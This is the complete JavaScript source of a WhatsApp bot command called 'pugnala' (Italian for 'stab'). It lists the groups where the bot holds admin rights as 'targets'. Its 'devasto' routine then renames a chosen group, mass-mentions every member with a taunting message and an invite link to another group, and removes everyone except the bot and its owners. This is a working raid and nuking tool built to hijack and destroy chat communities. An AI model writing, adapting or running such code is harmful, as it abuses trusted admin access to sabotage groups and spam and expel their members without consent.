let handler = async (m, { conn, text }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    const botId = (conn.user.id.split(':')[0] + '@s.whatsapp.net').toLowerCase();

    // --- LOGICA PRIVATA: LISTA BERSAGLI ---
    if (!m.isGroup) {
        if (!text) {
            await m.reply("⏳ *Analisi in corso... controllo tutti i gruppi.*");
            console.log("[PUGNALA] Avvio scansione gruppi per l'owner...");

            let groups;
            try {
                groups = await conn.groupFetchAllParticipating();
            } catch (e) {
                console.error("[PUGNALA] Errore nel fetch dei gruppi:", e);
                return m.reply("❌ Errore critico nel recupero della lista gruppi.");
            }

            let adminGroups = [];
            let ids = Object.keys(groups);

            for (let id of ids) {
                try {
                    // Chiediamo direttamente al server i dati aggiornati
                    let meta = await conn.groupMetadata(id).catch(() => null);
                    if (!meta) continue;

                    let participants = meta.participants || [];
                    // Cerchiamo il bot tra i partecipanti
                    let bot = participants.find(p => (p.id || p.jid || "").toLowerCase() === botId);

                    if (bot && (bot.admin === 'admin' || bot.admin === 'superadmin')) {
                        adminGroups.push({ id, subject: meta.subject });
                    }
                } catch (err) {
                    continue; 
                }
            }

            if (adminGroups.length === 0) {
                return m.reply("❌ Non ho trovato gruppi dove sono admin.\n\n*Suggerimento:* Prova a scrivere qualcosa nel gruppo bersaglio per 'svegliare' il bot, poi riprova in privata.");
            }

            let txt = "🩸 *𝐋𝐈𝐒𝐓𝐀 𝐁𝐄𝐑𝐒𝐀𝐆𝐋𝐈 𝐁𝐋𝐎𝐎𝐃* 🩸\n\n";
            adminGroups.forEach((g, i) => {
                txt += `*${i + 1}.* ${g.subject}\nID: \`${g.id}\`\n\n`;
            });
            txt += "Copia l'ID e scrivi: `.pugnala [ID]`";
            return m.reply(txt);
        }

        // Se l'utente ha inserito un ID (es. .pugnala 12345@g.us)
        let targetId = text.trim();
        if (!targetId.endsWith('@g.us')) return m.reply("❌ L'ID deve finire con @g.us");

        try {
            let meta = await conn.groupMetadata(targetId);
            await m.reply(`⚔️ *TARGET:* ${meta.subject}\nEseguendo il devasto remoto...`);
            await executeDevasto(conn, targetId, meta.participants, botId, ownerJids);
            return m.reply("✅ Operazione conclusa.");
        } catch (e) {
            return m.reply("❌ Impossibile colpire questo ID. Assicurati che sia corretto.");
        }
    }

    // --- LOGICA GRUPPO: ESECUZIONE DIRETTA ---
    try {
        let meta = await conn.groupMetadata(m.chat);
        let bot = meta.participants.find(p => (p.id || p.jid || "").toLowerCase() === botId);
        if (!bot || !bot.admin) return m.reply("❌ Non sono admin qui.");

        await executeDevasto(conn, m.chat, meta.participants, botId, ownerJids);
    } catch (e) {
        m.reply("❌ Errore durante l'esecuzione nel gruppo.");
    }
};

async function executeDevasto(conn, chatId, participants, botId, ownerJids) {
    try {
        // 1. Cambio Nome
        await conn.groupUpdateSubject(chatId, `𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`).catch(() => {});

        // 2. Messaggi di scherno
        let allJids = participants.map(p => p.id || p.jid);
        await conn.sendMessage(chatId, { 
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎.\n𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝.\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
            mentions: allJids
        });

        // 3. Rimozione (escludendo bot e owner)
        let toRemove = allJids.filter(jid => jid.toLowerCase() !== botId && !ownerJids.includes(jid.toLowerCase()));

        for (let user of toRemove) {
            // Rimuoviamo uno a uno con un piccolo delay per non sovraccaricare la connessione
            await conn.groupParticipantsUpdate(chatId, [user], 'remove').catch(() => {});
            await new Promise(resolve => setTimeout(resolve, 250));
        }
    } catch (e) {
        console.error("Errore Devasto:", e);
    }
}

handler.command = ['pugnala'];
handler.owner = true;

export default handler;
